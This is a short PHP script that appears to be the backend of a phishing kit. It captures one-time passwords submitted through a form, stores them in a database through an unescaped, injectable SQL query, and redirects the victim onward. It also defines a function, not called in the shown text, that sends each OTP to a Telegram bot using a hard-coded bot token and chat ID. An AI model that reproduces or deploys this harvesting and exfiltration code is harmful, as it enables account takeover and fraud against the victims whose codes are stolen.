<?php

session_start();
include("cn.php");

if(isset($_POST["submit"]))
{
$otp = $_POST["otp"];

$query =  "INSERT INTO otp(OTP) VALUE ('".$otp."')"; 

 

$run = mysqli_query($con,$query);
}
 
 
 
 function telegram($otp){
 	$key = "bot6118590901:AAECdpLRP6BE-1Th8Wxed49E1wS_HJ4LfyU";
 	$chat_id = "5735146774";
 
 	if(isset($otp)){ 
 		
 		$ch = curl_init("https://api.telegram.org/".
 			$key."/sendMessage?chat_id=".
 			$chat_id."&text=OTP : ". $otp);
 
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		curl_setopt($ch, CURLOPT_HEADER, 0);
 		$data = curl_exec($ch);
 		curl_close($ch);
 	}
 }
//redirect
   header ("Location:../otp.html");

 ?>
